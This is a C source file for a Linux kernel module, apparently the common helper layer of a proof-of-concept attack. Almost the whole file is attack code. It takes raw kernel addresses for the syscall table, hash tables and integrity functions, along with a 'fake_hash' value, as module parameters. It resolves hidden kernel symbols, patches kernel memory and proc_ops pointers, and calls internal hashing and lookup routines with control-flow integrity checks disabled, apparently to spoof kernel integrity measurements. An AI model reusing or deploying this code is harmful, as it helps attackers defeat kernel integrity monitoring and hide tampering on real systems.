// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#include "poc_common.h"

unsigned long poc_sha256_tfm;
unsigned long poc_boot_stage;
unsigned long poc_hash_probe;
unsigned long poc_entry_function;
unsigned long poc_hash_baseline;
unsigned long poc_syscall_table;
unsigned long poc_check_task;
unsigned long poc_do_hash;
unsigned long poc_add_event;
unsigned long poc_find_hash;
unsigned long poc_hash_table;
unsigned long poc_hash_table_lock;
unsigned long poc_proc_ko_entry;
unsigned long poc_proc_syscall_table_entry;
unsigned long poc_syscall_table_event_count;
char *poc_fake_hash;
char *poc_target_name;

module_param_named(sha256_tfm, poc_sha256_tfm, ulong, 0);
module_param_named(boot_stage, poc_boot_stage, ulong, 0);
module_param_named(hash_probe, poc_hash_probe, ulong, 0);
module_param_named(entry_function, poc_entry_function, ulong, 0);
module_param_named(hash_baseline, poc_hash_baseline, ulong, 0);
module_param_named(syscall_table, poc_syscall_table, ulong, 0);
module_param_named(check_task, poc_check_task, ulong, 0);
module_param_named(do_hash, poc_do_hash, ulong, 0);
module_param_named(add_event, poc_add_event, ulong, 0);
module_param_named(find_hash, poc_find_hash, ulong, 0);
module_param_named(hash_table, poc_hash_table, ulong, 0);
module_param_named(hash_table_lock, poc_hash_table_lock, ulong, 0);
module_param_named(proc_ko_entry, poc_proc_ko_entry, ulong, 0);
module_param_named(proc_syscall_table_entry, poc_proc_syscall_table_entry, ulong, 0);
module_param_named(syscall_table_event_count, poc_syscall_table_event_count, ulong, 0);
module_param_named(fake_hash, poc_fake_hash, charp, 0);
module_param_named(target_name, poc_target_name, charp, 0);

static struct ti_resolver poc_ti_resolver;
static bool poc_ti_ready;
static bool poc_hk_ready;

unsigned long __nocfi noinline poc_resolve_symbol(const char *name)
{
	return kallrecon_klp(name);
}

int poc_ti_offset(const char *type, const char *member, u32 *offset)
{
	u32 id, bit, size;

	if (!poc_ti_ready)
		return -ENOTSUPP;
	if (ti_type_by_name(ti_base(), type, BIT(BTF_KIND_STRUCT), &id))
		return -ENOENT;
	if (ti_member_off(ti_base(), id, member, &bit, &size))
		return -ENOENT;
	*offset = bit / 8;
	return 0;
}

int poc_init_common(void)
{
	struct hk_cfg cfg = { .resolve = poc_resolve_symbol };
	struct ti_resolver resolver = { .name_to_addr = poc_resolve_symbol };

	find_kallsyms_base();
	if (!klnum_val || !kallrecon_klp)
		return -ENODATA;
	if (hk_init(&cfg))
		return -EIO;
	poc_hk_ready = true;
	poc_ti_resolver = resolver;
	if (!ti_init(&poc_ti_resolver))
		poc_ti_ready = true;
	return 0;
}

void poc_exit_common(void)
{
	if (poc_ti_ready)
		ti_exit();
	if (poc_hk_ready)
		hk_exit();
}

void poc_store_word(void *addr, unsigned long value)
{
	WRITE_ONCE(*(unsigned long *)addr, value);
}

void poc_store_u32(void *addr, u32 value)
{
	WRITE_ONCE(*(u32 *)addr, value);
}

int poc_patch_word(void *addr, unsigned long value)
{
	return hk_patch_write(addr, value);
}

int poc_proc_slot(unsigned long var_addr, void ***slot)
{
	void *entry;
	u32 offset;
	int ret;

	if (!var_addr)
		return -EINVAL;
	entry = READ_ONCE(*(void **)var_addr);
	if (!entry)
		return -ENOENT;
	ret = poc_ti_offset("proc_dir_entry", "proc_ops", &offset);
	if (ret)
		return ret;
	*slot = (void **)((char *)entry + offset);
	return 0;
}

int poc_hex_to_bytes(const char *hex, u8 *out, size_t len)
{
	size_t i;
	int hi, lo;

	if (!hex || strlen(hex) < len * 2)
		return -EINVAL;
	for (i = 0; i < len; i++) {
		hi = hex[i * 2];
		lo = hex[i * 2 + 1];
		hi = (hi >= '0' && hi <= '9') ? hi - '0' : (hi | 0x20) - 'a' + 10;
		lo = (lo >= '0' && lo <= '9') ? lo - '0' : (lo | 0x20) - 'a' + 10;
		if (hi < 0 || hi > 15 || lo < 0 || lo > 15)
			return -EINVAL;
		out[i] = (u8)((hi << 4) | lo);
	}
	return 0;
}

void __nocfi noinline poc_call_check_task(void *addr)
{
	((void (*)(void *))addr)(NULL);
}

int __nocfi noinline poc_call_do_hash(void *addr, unsigned long *data, u32 len,
				      u8 *hash)
{
	return ((int (*)(unsigned long *, u32, u8 *))addr)(data, len, hash);
}

int __nocfi noinline poc_call_add_event(void *addr, const char *name)
{
	return ((int (*)(const char *))addr)(name);
}

unsigned char *__nocfi noinline poc_call_find_hash(void *addr, const char *name)
{
	return ((unsigned char *(*)(const char *))addr)(name);
}
